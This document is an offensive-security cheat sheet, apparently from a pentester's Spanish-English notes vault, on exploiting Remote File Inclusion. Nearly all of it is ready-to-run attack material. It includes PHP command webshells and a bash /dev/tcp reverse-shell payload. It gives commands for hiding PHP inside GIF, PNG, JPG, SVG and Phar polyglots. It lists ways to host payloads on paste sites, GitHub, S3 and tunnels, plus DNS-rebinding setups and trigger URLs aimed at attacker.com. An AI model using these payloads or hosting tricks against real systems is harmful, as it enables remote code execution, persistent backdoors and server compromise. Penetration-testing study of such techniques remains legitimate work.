---
aliases:
  - RFI Webshell Hosting
  - Polyglot Files RFI
  - Public Payload Servers
tags:
  - type/technique
  - vuln/rfi
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[Remote File Inclusion (RFI)]]'
---
# RFI - Hostear Payload Remote

***

## Webshell Setup Atacante

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `python3 -m http.server 80 --bind 0.0.0.0` (in payload dir) | Quick HTTP server payload host | Standard. |
| `python3 -m http.server 443 --bind 0.0.0.0` con TLS reverse proxy | HTTPS via reverse proxy | TLS variant. |
| `php -S 0.0.0.0:80 -t /tmp/rfi-payloads` | PHP built-in server | PHP-native. |
| `python3 -m uploadserver 80` (con `pip install uploadserver`) | HTTP server + file upload | Upload+host. |
| `ngrok http 80 --domain=rfi-attacker.ngrok.app` | ngrok tunnel public expose local | Public tunnel. |
| `cloudflared tunnel --url http://localhost:80` | Cloudflare Tunnel public expose | Modern alt. |
| `aws s3 cp shell.php s3://rfi-bucket/ --acl public-read` | AWS S3 public payload host | S3 host. |
| `aws s3 website s3://rfi-bucket --index-document shell.php` | S3 static site enable | Static site. |
| `git init shell-repo && cp shell.php shell-repo/ && cd shell-repo && git remote add origin git@github.com:attacker/shell-repo.git && git push -u origin main && curl https://raw.githubusercontent.com/attacker/shell-repo/main/shell.php` | GitHub raw URL host | Free hosting. |
| `heroku create rfi-app && git push heroku main` (host PHP) | Heroku deploy | Easy. |
| `certbot certonly --standalone -d attacker.com` | Free Let's Encrypt cert | TLS legit-looking. |
| `cat > /tmp/rfi-payloads/shell.php <<'EOF'
<?php if(isset($_GET['c'])) system($_GET['c']); ?>
EOF` | Standard webshell | Standard payload. |
| `cat > /tmp/rfi-payloads/rev.php <<'EOF'
<?php passthru("bash -c \"bash -i >& /dev/tcp/IP/4444 0>&1\""); ?>
EOF` | Reverse shell payload | RS combo. |
| `subjack -w subs.txt -t 100 -timeout 30 -ssl -c fingerprints.json` luego claim → host | Subdomain takeover + host | SDT stealth. |
| `python3 -c "import http.server,ssl; h=http.server.HTTPServer(('0.0.0.0',443),http.server.SimpleHTTPRequestHandler); h.socket=ssl.wrap_socket(h.socket, certfile='cert.pem', keyfile='key.pem', server_side=True); h.serve_forever()"` | Python HTTPS server | TLS server. |
^rfi-host-setup

### Quick HTTP server for RFI

```bash
mkdir /tmp/rfi-payloads
cd /tmp/rfi-payloads

# Webshell
cat > shell.php <<'EOF'
<?php
if (isset($_GET['c'])) {
    system($_GET['c']);
}
?>
EOF

# Reverse shell
cat > rev.php <<'EOF'
<?php
$ip = '10.10.14.5';
$port = 4444;
passthru("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
?>
EOF

python3 -m http.server 80

# Trigger
# curl 'https://target/index.php?page=http://attacker.com/shell.php&c=id'
```

___

## Polyglot Files

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `(printf 'GIF89a'; echo '<?php system($_GET["c"]); ?>') > shell.gif` | GIF89a + PHP polyglot | Standard polyglot. |
| `exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg` | JPG EXIF Comment PHP payload | EXIF stealth. |
| `exiftool -Make='<?php system($_GET["c"]); ?>' image.jpg` | JPG EXIF Make field PHP | Alt field. |
| `printf '\x89PNG\r\n\x1a\n' > shell.png && echo '<?php system($_GET["c"]); ?>' >> shell.png` | PNG magic + PHP polyglot | PNG polyglot. |
| `exiftool -Comment='<?php phpinfo(); ?>' image.png` | PNG comment PHP | PNG variant. |
| `python3 -c "import zipfile; z=zipfile.ZipFile('p.phar.jpg','w'); z.writestr('shell.php','<?php system(\$_GET[\"c\"]); ?>'); z.close()"` | ZIP+JPG polyglot Phar | Phar polyglot. |
| `cat <<'EOF' > shell.svg
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg"><?php system($_GET["c"]); ?></svg>
EOF` | SVG XML + PHP polyglot | SVG combo. |
| `python3 polyglot-jpg-php.py shell.php image.jpg out.jpg` (custom tool) | JPG+PHP polyglot script | Script tool. |
| `phpggc -p phar+jpeg Monolog/RCE1 system 'id' -o evil.jpg` | phpggc auto polyglot | phpggc helper. |
| `strings shell.jpg \| grep -i 'php\|system'` | Verify PHP block in polyglot | Verify. |
| `file shell.jpg` (Magic bytes verify) | Verify MIME type detection | Verify magic. |
| `curl -F 'file=@shell.jpg' https://target/upload && curl 'https://target/?page=https://target/uploads/shell.jpg&c=id'` | Upload polyglot + RFI trigger | Standard chain. |
^rfi-host-polyglot

### Polyglot JPG + PHP

```bash
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg
strings image.jpg | grep -i 'php\|system'
cp image.jpg /tmp/rfi-payloads/shell.jpg
python3 -m http.server 80

# curl 'https://target/index.php?page=http://attacker.com/shell.jpg&c=id'
```

___

## Public Payload Servers

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -F 'paste_code=<?php system($_GET["c"]); ?>' -F 'paste_format=1' https://pastebin.com/api/api_post.php` luego `curl 'https://target/?page=https://pastebin.com/raw/HASH&c=id'` | Pastebin raw URL host | Pastebin host. |
| `gh gist create shell.php --public` luego `curl https://gist.githubusercontent.com/USER/HASH/raw/shell.php` | GitHub Gist host raw | Gist host. |
| `git init && echo '<?php system($_GET["c"]); ?>' > shell.php && git add . && git commit -m x && git push` luego use raw URL | GitHub repo raw URL | Standard repo. |
| `curl -F 'file=@shell.php' https://0x0.st` | 0x0.st temp file URL | Quick temp. |
| `curl -F 'f:1=<-' https://ix.io < shell.php` | ix.io paste service | Quick. |
| `cat shell.php \| nc termbin.com 9999` | termbin.com pipe upload | Pipe quick. |
| `gh gist create -p shell.php` (private Gist) | Private Gist (auth header needed) | Stealth Gist. |
| `aws s3 cp shell.php s3://rfi-bucket/ --acl public-read` luego `curl 'https://target/?page=https://rfi-bucket.s3.amazonaws.com/shell.php&c=id'` | AWS S3 public payload host | S3 host. |
| `rclone copy shell.php cloudflare-r2:bucket/ -P` | Cloudflare R2 (S3-compatible) host | R2 cheap. |
| `b2 upload-file rfi-bucket shell.php shell.php` (Backblaze B2) | Backblaze B2 host | B2 cheap. |
| `npx serve /tmp/rfi-payloads --listen 80` | npx serve quick HTTP | npx static. |
| `python3 -m pip install pastebinapi && python3 -c "..."` | API automate paste host | Programmatic. |
| `curl -F 'sprunge=<-' http://sprunge.us < shell.php` | sprunge.us paste | Simple paste. |
^rfi-host-public

### Pastebin RFI

```bash
# Create paste manually or via API:
curl -X POST 'https://pastebin.com/api/api_post.php' \
  -d "api_dev_key=$DEV_KEY&api_option=paste&api_paste_code=<?php system(\$_GET['c']); ?>"

# Trigger
curl "https://target/index.php?page=https://pastebin.com/raw/abcd1234&c=id"
```

___

## DNS Rebinding

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `git clone https://github.com/nccgroup/singularity && cd singularity && python3 -m pip install -r requirements.txt && python3 singularity.py` | Singularity rebinding framework | Standard tool. |
| `dig +short rebind.attacker.com` (TTL=0) | Verify TTL=0 forces re-resolve | Verify TTL. |
| `curl --resolve target.com:443:LEGIT_IP https://target.com/ && sleep 5 && curl --resolve target.com:443:ATTACKER_IP https://target.com/` | Manual rebind two-stage curl | DIY rebind. |
| Singularity → "DNS Rebinding Attack" → set target host → start | Configure rebinding via Singularity UI | UI workflow. |
| `python3 -c "import dnslib.server; ..."` (custom DNS server con rotating answers) | Custom DNS rotating answer | DIY DNS server. |
| `curl 'https://target/?page=http://rebind.attacker.com/shell.php&c=id'` (rebind triggers) | RFI via rebind hostname | Standard RFI rebind. |
| `nslookup rebind.attacker.com 8.8.8.8` luego `nslookup rebind.attacker.com 1.1.1.1` | Verify same query different answers | DNS verify. |
| `curl --dns-servers 1.1.1.1 'https://target/?page=http://rebind.attacker.com/shell.php'` | curl custom DNS server | Per-request DNS. |
| `curl 'https://target/?page=http://lock.cmpxchg8b.com/shell.php'` | Public test rebinding service | Public test. |
| `dig +short A rebind.attacker.com @ns1.attacker.com` luego repeat | Verify rotating A records | Verify rotation. |
| `python3 rebinder.py --target target.com --attacker ATTACKER_IP --legit LEGIT_IP --ttl 0` (custom) | Custom Python rebinder | DIY. |
| `curl --doh-url https://1.1.1.1/dns-query 'https://target/?page=http://rebind.attacker.com/shell.php'` | DoH bypass DNS filter | DoH variant. |
^rfi-host-dnsrebind

***
